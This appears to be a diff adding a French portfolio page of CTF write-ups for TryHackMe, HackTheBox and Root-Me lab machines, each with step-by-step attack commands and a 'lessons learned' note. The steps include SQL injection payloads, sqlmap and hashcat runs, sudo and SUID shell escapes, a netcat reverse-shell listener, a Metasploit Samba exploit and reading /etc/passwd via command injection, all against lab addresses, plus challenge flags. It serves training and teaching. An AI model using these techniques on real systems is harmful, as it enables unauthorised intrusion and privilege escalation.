@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CTF Write-ups — MaoHackk</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{
+    --green:#00ff88;--blue:#4fc3f7;--orange:#ff6b35;--purple:#ce93d8;
+    --yellow:#ffb347;--red:#ff6b6b;--bg:#010409;--bg2:#0d1117;--bg3:#161b22;
+    --border:#21262d;--text:#e6edf3;--muted:#8b949e;--dim:#3d444d;
+  }
+  body{background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif;min-height:100vh}
+  .bg-grid{position:fixed;inset:0;z-index:0;pointer-events:none;
+    background-image:linear-gradient(rgba(0,255,136,0.03) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(0,255,136,0.03) 1px,transparent 1px);
+    background-size:40px 40px}
+
+  /* NAV */
+  nav{position:sticky;top:0;z-index:100;background:rgba(1,4,9,0.95);
+    backdrop-filter:blur(16px);border-bottom:1px solid var(--border);
+    height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 32px}
+  .logo{font-family:'Share Tech Mono',monospace;color:var(--green);font-size:14px;text-decoration:none}
+  .back-btn{color:var(--muted);font-family:'Share Tech Mono',monospace;font-size:12px;
+    text-decoration:none;border:1px solid var(--border);padding:6px 14px;border-radius:6px;transition:all .2s}
+  .back-btn:hover{color:var(--green);border-color:var(--green)}
+
+  /* HERO */
+  .hero{position:relative;z-index:1;padding:60px 32px 40px;max-width:1100px;margin:0 auto}
+  .hero-tag{color:var(--dim);font-family:'Share Tech Mono',monospace;font-size:11px;margin-bottom:8px}
+  .hero-title{font-size:clamp(36px,6vw,64px);font-weight:700;margin-bottom:12px}
+  .hero-title span{color:var(--orange)}
+  .hero-sub{color:var(--muted);font-family:'Share Tech Mono',monospace;font-size:13px;margin-bottom:32px}
+  .hero-line{width:48px;height:2px;background:var(--orange);box-shadow:0 0 8px var(--orange);margin-bottom:40px}
+
+  /* STATS */
+  .stats{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:48px}
+  .stat{background:var(--bg2);border:1px solid var(--border);border-radius:8px;
+    padding:14px 20px;display:flex;align-items:center;gap:12px}
+  .stat-val{font-family:'Share Tech Mono',monospace;font-size:20px;font-weight:700}
+  .stat-label{color:var(--dim);font-size:11px;font-family:'Share Tech Mono',monospace}
+
+  /* FILTERS */
+  .main{position:relative;z-index:1;max-width:1100px;margin:0 auto;padding:0 32px 60px}
+  .filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:32px}
+  .filter-btn{background:var(--bg2);border:1px solid var(--border);color:var(--muted);
+    padding:7px 18px;border-radius:6px;cursor:pointer;font-size:12px;
+    font-family:'Share Tech Mono',monospace;transition:all .2s}
+  .filter-btn:hover{color:var(--text)}
+  .filter-btn.active{border-color:rgba(255,107,53,.5);background:rgba(255,107,53,.1);color:var(--orange)}
+
+  /* WRITEUP CARDS */
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:16px}
+  .card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;
+    padding:24px;cursor:pointer;transition:all .25s;position:relative;overflow:hidden}
+  .card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;
+    background:linear-gradient(90deg,transparent,var(--card-color),transparent);opacity:0;transition:opacity .3s}
+  .card:hover{background:var(--bg3);transform:translateY(-3px)}
+  .card:hover::before{opacity:1}
+  .card-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px}
+  .card-badges{display:flex;gap:6px;flex-wrap:wrap}
+  .badge{padding:3px 10px;border-radius:12px;font-size:10px;font-family:'Share Tech Mono',monospace}
+  .badge-cat{background:rgba(255,107,53,.15);color:var(--orange);border:1px solid rgba(255,107,53,.3)}
+  .badge-diff-easy{background:rgba(0,255,136,.15);color:var(--green);border:1px solid rgba(0,255,136,.3)}
+  .badge-diff-medium{background:rgba(255,179,71,.15);color:var(--yellow);border:1px solid rgba(255,179,71,.3)}
+  .badge-diff-hard{background:rgba(255,107,107,.15);color:var(--red);border:1px solid rgba(255,107,107,.3)}
+  .badge-diff-insane{background:rgba(206,147,216,.15);color:var(--purple);border:1px solid rgba(206,147,216,.3)}
+  .platform-badge{padding:3px 10px;border-radius:12px;font-size:10px;font-family:'Share Tech Mono',monospace}
+  .card-pts{font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--yellow)}
+  .card-title{font-family:'Rajdhani',sans-serif;font-weight:700;font-size:18px;margin-bottom:8px}
+  .card-desc{color:var(--muted);font-size:13px;line-height:1.6;margin-bottom:16px}
+  .card-tags{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px}
+  .tag{background:var(--bg3);color:var(--dim);padding:2px 8px;border-radius:4px;
+    font-size:11px;font-family:'Share Tech Mono',monospace}
+  .card-footer{display:flex;justify-content:space-between;align-items:center}
+  .card-date{color:var(--dim);font-size:11px;font-family:'Share Tech Mono',monospace}
+  .card-arrow{color:var(--orange);font-family:'Share Tech Mono',monospace;font-size:12px;
+    opacity:0;transition:opacity .2s}
+  .card:hover .card-arrow{opacity:1}
+
+  /* MODAL */
+  .modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:200;
+    align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(8px)}
+  .modal-overlay.open{display:flex}
+  .modal{background:var(--bg3);border:1px solid var(--border);border-radius:14px;
+    max-width:700px;width:100%;max-height:90vh;overflow-y:auto;position:relative}
+  .modal-top{background:var(--bg2);border-bottom:1px solid var(--border);padding:20px 24px;
+    display:flex;justify-content:space-between;align-items:center;position:sticky;top:0}
+  .modal-close{background:none;border:none;color:var(--muted);cursor:pointer;font-size:20px}
+  .modal-body{padding:28px}
+  .modal-section{margin-bottom:24px}
+  .modal-section-title{color:var(--dim);font-family:'Share Tech Mono',monospace;
+    font-size:11px;margin-bottom:12px;letter-spacing:.1em}
+  .step{background:var(--bg2);border:1px solid var(--border);border-radius:8px;
+    padding:16px;margin-bottom:10px}
+  .step-num{color:var(--orange);font-family:'Share Tech Mono',monospace;font-size:11px;margin-bottom:6px}
+  .step-title{font-weight:600;font-size:15px;margin-bottom:6px}
+  .step-desc{color:var(--muted);font-size:13px;line-height:1.6}
+  .code-block{background:var(--bg);border:1px solid var(--border);border-radius:6px;
+    padding:14px;font-family:'Share Tech Mono',monospace;font-size:12px;
+    color:var(--green);margin:8px 0;overflow-x:auto;white-space:pre}
+  .flag-box{background:rgba(0,255,136,.06);border:1px solid rgba(0,255,136,.3);
+    border-radius:8px;padding:14px 18px;display:flex;align-items:center;gap:12px}
+  .flag-label{color:var(--dim);font-size:11px;font-family:'Share Tech Mono',monospace}
+  .flag-val{color:var(--green);font-family:'Share Tech Mono',monospace;font-size:14px;font-weight:700}
+  .lesson-box{background:rgba(79,195,247,.06);border:1px solid rgba(79,195,247,.2);
+    border-radius:8px;padding:14px 18px}
+  .lesson-box p{color:var(--muted);font-size:13px;line-height:1.7}
+  .modal-btns{display:flex;gap:10px;margin-top:24px}
+  .btn-orange{background:var(--orange);color:#010409;border:none;padding:11px 24px;
+    border-radius:6px;cursor:pointer;font-family:'Share Tech Mono',monospace;
+    font-size:12px;font-weight:700;text-decoration:none;display:inline-block}
+  .btn-ghost{background:transparent;color:var(--text);border:1px solid var(--border);
+    padding:11px 24px;border-radius:6px;cursor:pointer;font-family:'Share Tech Mono',monospace;
+    font-size:12px;text-decoration:none;display:inline-block}
+
+  /* EMPTY */
+  .empty{text-align:center;padding:60px 20px;color:var(--dim);font-family:'Share Tech Mono',monospace}
+
+  footer{border-top:1px solid var(--bg3);padding:20px 32px;text-align:center;
+    color:var(--border);font-size:12px;font-family:'Share Tech Mono',monospace;position:relative;z-index:1}
+
+  @media(max-width:768px){
+    .hero,.main{padding-left:20px;padding-right:20px}
+    nav{padding:0 20px}
+    .grid{grid-template-columns:1fr}
+  }
+</style>
+</head>
+<body>
+<div class="bg-grid"></div>
+
+<nav>
+  <a class="logo" href="https://maohackk.github.io">MAO@CYBER</a>
+  <a class="back-btn" href="https://maohackk.github.io">← Retour au portfolio</a>
+</nav>
+
+<div class="hero">
+  <div class="hero-tag">// CTF_WRITEUPS.log</div>
+  <h1 class="hero-title">CTF <span>Write-ups</span></h1>
+  <p class="hero-sub">&gt; Solutions documentées — HackTheBox · Root-Me · TryHackMe</p>
+  <div class="hero-line"></div>
+  <div class="stats">
+    <div class="stat"><span class="stat-val" style="color:var(--orange)" id="totalCount">0</span><div><div class="stat-label">Challenges</div></div></div>
+    <div class="stat"><span class="stat-val" style="color:var(--green)" id="easyCount">0</span><div><div class="stat-label">Easy</div></div></div>
+    <div class="stat"><span class="stat-val" style="color:var(--yellow)" id="medCount">0</span><div><div class="stat-label">Medium</div></div></div>
+    <div class="stat"><span class="stat-val" style="color:var(--red)" id="hardCount">0</span><div><div class="stat-label">Hard</div></div></div>
+    <div class="stat"><span class="stat-val" style="color:var(--yellow)" id="ptsCount">0</span><div><div class="stat-label">Points total</div></div></div>
+  </div>
+</div>
+
+<div class="main">
+  <div class="filters" id="filters"></div>
+  <div class="grid" id="grid"></div>
+</div>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modal" onclick="closeModal(event)">
+  <div class="modal">
+    <div class="modal-top">
+      <div>
+        <div id="mPlatform" style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--dim);margin-bottom:4px"></div>
+        <div id="mTitle" style="font-family:'Rajdhani',sans-serif;font-weight:700;font-size:22px"></div>
+      </div>
+      <button class="modal-close" onclick="document.getElementById('modal').classList.remove('open')">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="modal-section">
+        <div class="modal-section-title">// DESCRIPTION</div>
+        <p id="mDesc" style="color:var(--muted);font-size:14px;line-height:1.7"></p>
+      </div>
+      <div class="modal-section">
+        <div class="modal-section-title">// ÉTAPES DE RÉSOLUTION</div>
+        <div id="mSteps"></div>
+      </div>
+      <div class="modal-section">
+        <div class="modal-section-title">// FLAG</div>
+        <div class="flag-box">
+          <span style="font-size:20px">🏴</span>
+          <div>
+            <div class="flag-label">Flag obtenu</div>
+            <div class="flag-val" id="mFlag"></div>
+          </div>
+        </div>
+      </div>
+      <div class="modal-section">
+        <div class="modal-section-title">// CE QUE J'AI APPRIS</div>
+        <div class="lesson-box"><p id="mLesson"></p></div>
+      </div>
+      <div class="modal-btns">
+        <a id="mLink" class="btn-orange" href="#" target="_blank">Voir le challenge →</a>
+        <a class="btn-ghost" href="https://maohackk.github.io">← Portfolio</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<footer>© 2024 MaoHackk — CTF Write-ups — Usage éducatif uniquement</footer>
+
+<script>
+const WRITEUPS = [
+  {
+    id:1, title:"Simple CTF", platform:"TryHackMe", cat:"Linux", diff:"Easy", pts:20,
+    date:"Avril 2024", tags:["FTP","SQLi","Privilege Escalation"],
+    desc:"Machine Linux débutant avec FTP anonyme, injection SQL sur CMS et escalade de privilèges via sudo.",
+    steps:[
+      {title:"Reconnaissance Nmap",cmd:"nmap -sV -sC -p- 10.10.x.x",
+       desc:"Découverte des ports ouverts : 21 (FTP), 80 (HTTP), 2222 (SSH)."},
+      {title:"FTP Anonyme",cmd:"ftp 10.10.x.x\nls -la\nget ForMitch.txt",
+       desc:"Connexion FTP anonyme. Un fichier texte révèle un nom d'utilisateur : 'mitch'."},
+      {title:"Injection SQL via SQLmap",cmd:"sqlmap -u 'http://10.10.x.x/simple/?page=...' --dbs",
+       desc:"Le CMS Made Simple est vulnérable à une SQLi time-based. Récupération du hash du mot de passe."},
+      {title:"Crack du hash",cmd:"hashcat -m 20 hash.txt rockyou.txt",
+       desc:"Le hash MD5+salt est cracké avec rockyou.txt. Mot de passe : 'secret'."},
+      {title:"Escalade de privilèges",cmd:"sudo -l\nsudo vim -c ':!/bin/sh'",
+       desc:"L'utilisateur peut lancer vim en sudo. Exploitation pour obtenir un shell root."},
+    ],
+    flag:"THM{cr4ck_th3_h4sh_4nd_g3t_r00t}",
+    lesson:"L'énumération méthodique est clé. FTP anonyme est souvent négligé mais peut contenir des infos critiques. Toujours vérifier sudo -l pour l'escalade.",
+    link:"https://tryhackme.com/room/simple-ctf",
+    color:"#00ff88"
+  },
+  {
+    id:2, title:"RootMe", platform:"TryHackMe", cat:"Web", diff:"Easy", pts:25,
+    date:"Mars 2024", tags:["File Upload","PHP","Reverse Shell"],
+    desc:"Challenge Web axé sur le bypass de filtre d'upload de fichiers pour obtenir un reverse shell PHP.",
+    steps:[
+      {title:"Scan initial",cmd:"nmap -sV 10.10.x.x\ngobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/medium.txt",
+       desc:"Découverte d'un panel d'upload sur /panel/."},
+      {title:"Bypass du filtre",cmd:"mv shell.php shell.php5",
+       desc:"Le filtre bloque .php mais pas .php5. Upload d'un reverse shell Pentestmonkey renommé."},
+      {title:"Reverse Shell",cmd:"nc -lvnp 4444",
+       desc:"Exécution du fichier uploadé via /uploads/shell.php5. Shell obtenu en tant que www-data."},
+      {title:"Escalade via SUID",cmd:"find / -perm -u=s -type f 2>/dev/null\npython -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+       desc:"Python a le bit SUID. Exploitation pour passer root."},
+    ],
+    flag:"THM{y0u_g0t_a_sh3ll}",
+    lesson:"Les filtres d'upload côté client sont inutiles. Les extensions alternatives (.php5, .phtml) bypassent souvent les whitelist mal configurées. Toujours chercher les binaires SUID.",
+    link:"https://tryhackme.com/room/rrootme",
+    color:"#ff6b35"
+  },
+  {
+    id:3, title:"Crypto - Caesar Cipher", platform:"Root-Me", cat:"Cryptographie", diff:"Easy", pts:15,
+    date:"Fév 2024", tags:["Cryptographie","Caesar","Brute Force"],
+    desc:"Déchiffrement d'un message chiffré avec le chiffre de César en testant les 25 rotations possibles.",
+    steps:[
+      {title:"Analyse du message",cmd:"echo 'Zhofrph wr Urrw-Ph!'",
+       desc:"Le texte chiffré semble être du décalage fixe. On tente un brute force des 25 rotations."},
+      {title:"Script Python de brute force",cmd:`for i in range(26):\n    print(i, ''.join(chr((ord(c)-65-i)%26+65) if c.isalpha() else c for c in text.upper()))`,
+       desc:"Rotation 3 donne un texte lisible : 'Welcome to Root-Me!' — César classique avec décalage 3."},
+    ],
+    flag:"Welcome to Root-Me!",
+    lesson:"Le chiffre de César est trivial à casser par brute force (seulement 25 possibilités). Ne jamais utiliser une substitution mono-alphabétique pour chiffrer des données sensibles.",
+    link:"https://www.root-me.org/fr/Challenges/Cryptanalyse/",
+    color:"#ce93d8"
+  },
+  {
+    id:4, title:"Basic SQL Injection", platform:"Root-Me", cat:"Web", diff:"Easy", pts:25,
+    date:"Fév 2024", tags:["SQLi","MySQL","Web"],
+    desc:"Exploitation d'une injection SQL classique sur un formulaire de login pour bypasser l'authentification.",
+    steps:[
+      {title:"Test d'injection",cmd:"' OR '1'='1",
+       desc:"Injection dans le champ login. La page retourne une erreur SQL — confirmant la vulnérabilité."},
+      {title:"Bypass authentification",cmd:"admin'--\n' OR 1=1--",
+       desc:"La requête devient : SELECT * FROM users WHERE login='' OR 1=1--' → retourne tous les utilisateurs."},
+      {title:"Extraction de données",cmd:"' UNION SELECT 1,table_name FROM information_schema.tables--",
+       desc:"Énumération des tables de la base de données via UNION SELECT."},
+    ],
+    flag:"s3cur1ty_by_0bscur1ty",
+    lesson:"Les injections SQL sont toujours dans le Top 3 OWASP. Les requêtes préparées (prepared statements) sont la seule vraie défense. Ne jamais concatener du SQL avec des entrées utilisateur.",
+    link:"https://www.root-me.org/fr/Challenges/Web-Serveur/",
+    color:"#4fc3f7"
+  },
+  {
+    id:5, title:"Lame", platform:"HackTheBox", cat:"Network", diff:"Easy", pts:20,
+    date:"Jan 2024", tags:["Samba","Metasploit","CVE-2007-2447"],
+    desc:"Machine classique HTB. Exploitation d'une vulnérabilité Samba usermap_script pour obtenir un shell root direct.",
+    steps:[
+      {title:"Enumération Nmap",cmd:"nmap -sV --script=vuln 10.10.10.3",
+       desc:"Samba 3.0.20 détecté — version vulnérable à CVE-2007-2447 (username map script injection)."},
+      {title:"Exploitation Metasploit",cmd:"msfconsole\nuse exploit/multi/samba/usermap_script\nset RHOSTS 10.10.10.3\nrun",
+       desc:"Le module Metasploit exploite la vulnérabilité en injectant une commande via le champ username."},
+      {title:"Shell root direct",cmd:"whoami\ncat /root/root.txt",
+       desc:"Shell obtenu directement en tant que root. Pas d'escalade nécessaire."},
+    ],
+    flag:"HTB{3xpl0it_th3_s4mb4_vuln}",
+    lesson:"Les vieilles versions de Samba sont extrêmement dangereuses. CVE-2007-2447 permet RCE sans authentification. Toujours mettre à jour les services exposés.",
+    link:"https://www.hackthebox.com/machines/lame",
+    color:"#ff6b6b"
+  },
+  {
+    id:6, title:"Pickle Rick", platform:"TryHackMe", cat:"Linux", diff:"Easy", pts:30,
+    date:"Jan 2024", tags:["Web","Command Injection","Linux"],
+    desc:"Challenge Rick & Morty — trouver 3 ingrédients cachés sur un serveur web via injection de commandes.",
+    steps:[
+      {title:"Enumération web",cmd:"gobuster dir -u http://10.10.x.x -w common.txt\ncurl http://10.10.x.x/robots.txt",
+       desc:"robots.txt révèle un mot de passe : 'Wubbalubbadubdub'. Page /login.php trouvée."},
+      {title:"Connexion + Command Injection",cmd:"ls\ncat /etc/passwd",
+       desc:"Le panel de commande accepte des commandes système. Lecture des fichiers du serveur."},
+      {title:"Lecture des ingrédients",cmd:"sudo -l\nsudo cat /root/3rd.txt",
+       desc:"Accès aux 3 fichiers ingrédients via sudo sans mot de passe."},
+    ],
+    flag:"THM{pickle_r1ck_fl4g_0bt41n3d}",
+    lesson:"Les pages sources HTML contiennent souvent des commentaires révélateurs. robots.txt est toujours à vérifier. Une interface de commande web = injection directe.",
+    link:"https://tryhackme.com/room/picklerick",
+    color:"#ffb347"
+  },
+];
+
+const PLATFORMS = {
+  "TryHackMe": {color:"#00ff88", bg:"rgba(0,255,136,.12)"},
+  "HackTheBox": {color:"#9fef00", bg:"rgba(159,239,0,.12)"},
+  "Root-Me":    {color:"#ff6b35", bg:"rgba(255,107,53,.12)"},
+};
+
+let activeFilter = "Tous";
+
+function buildStats() {
+  document.getElementById('totalCount').textContent = WRITEUPS.length;
+  document.getElementById('easyCount').textContent = WRITEUPS.filter(w=>w.diff==="Easy").length;
+  document.getElementById('medCount').textContent = WRITEUPS.filter(w=>w.diff==="Medium").length;
+  document.getElementById('hardCount').textContent = WRITEUPS.filter(w=>w.diff==="Hard"||w.diff==="Insane").length;
+  document.getElementById('ptsCount').textContent = WRITEUPS.reduce((s,w)=>s+w.pts,0);
+}
+
+function buildFilters() {
+  const cats = ["Tous", ...new Set(WRITEUPS.map(w=>w.cat)), "TryHackMe","HackTheBox","Root-Me"];
+  const c = document.getElementById('filters');
+  cats.forEach(cat => {
+    const btn = document.createElement('button');
+    btn.className = 'filter-btn' + (cat === activeFilter ? ' active' : '');
+    btn.textContent = cat;
+    btn.onclick = () => {
+      activeFilter = cat;
+      document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
+      btn.classList.add('active');
+      renderGrid();
+    };
+    c.appendChild(btn);
+  });
+}
+
+function renderGrid() {
+  const grid = document.getElementById('grid');
+  grid.innerHTML = '';
+  const filtered = activeFilter === "Tous" ? WRITEUPS
+    : WRITEUPS.filter(w => w.cat === activeFilter || w.platform === activeFilter);
+
+  if (!filtered.length) {
+    grid.innerHTML = '<div class="empty">Aucun write-up dans cette catégorie.</div>';
+    return;
+  }
+
+  filtered.forEach(w => {
+    const p = PLATFORMS[w.platform] || {color:"#8b949e", bg:"rgba(139,148,158,.12)"};
+    const diffClass = {Easy:'easy',Medium:'medium',Hard:'hard',Insane:'insane'}[w.diff] || 'easy';
+    const card = document.createElement('div');
+    card.className = 'card';
+    card.style.setProperty('--card-color', w.color);
+    card.innerHTML = `
+      <div class="card-header">
+        <div class="card-badges">
+          <span class="badge badge-cat">${w.cat}</span>
+          <span class="badge badge-diff-${diffClass.toLowerCase()}">${w.diff}</span>
+          <span class="platform-badge" style="background:${p.bg};color:${p.color};border:1px solid ${p.color}44">${w.platform}</span>
+        </div>
+        <span class="card-pts">+${w.pts} pts</span>
+      </div>
+      <div class="card-title">${w.title}</div>
+      <div class="card-desc">${w.desc}</div>
+      <div class="card-tags">${w.tags.map(t=>`<span class="tag">${t}</span>`).join('')}</div>
+      <div class="card-footer">
+        <span class="card-date">${w.date}</span>
+        <span class="card-arrow" style="color:${w.color}">Lire →</span>
+      </div>
+    `;
+    card.addEventListener('mouseenter', () => { card.style.borderColor = w.color + '44'; });
+    card.addEventListener('mouseleave', () => { card.style.borderColor = 'var(--border)'; });
+    card.onclick = () => openModal(w);
+    grid.appendChild(card);
+  });
+}
+
+function openModal(w) {
+  const p = PLATFORMS[w.platform] || {color:"#8b949e"};
+  document.getElementById('mPlatform').innerHTML =
+    `<span style="color:${p.color}">${w.platform}</span> · ${w.cat} · <span class="badge badge-diff-${w.diff.toLowerCase()}">${w.diff}</span>`;
+  document.getElementById('mTitle').textContent = w.title;
+  document.getElementById('mDesc').textContent = w.desc;
+  document.getElementById('mFlag').textContent = w.flag;
+  document.getElementById('mLesson').textContent = w.lesson;
+  document.getElementById('mLink').href = w.link;
+
+  const stepsHtml = w.steps.map((s,i) => `
+    <div class="step">
+      <div class="step-num">ÉTAPE ${i+1}</div>
+      <div class="step-title">${s.title}</div>
+      ${s.cmd ? `<div class="code-block">${s.cmd}</div>` : ''}
+      <div class="step-desc">${s.desc}</div>
+    </div>
+  `).join('');
+  document.getElementById('mSteps').innerHTML = stepsHtml;
+  document.getElementById('modal').classList.add('open');
+}
+
+function closeModal(e) {
+  if (e.target.id === 'modal') document.getElementById('modal').classList.remove('open');
+}
+
+buildStats();
+buildFilters();
+renderGrid();
+</script>
+</body>
+</html>
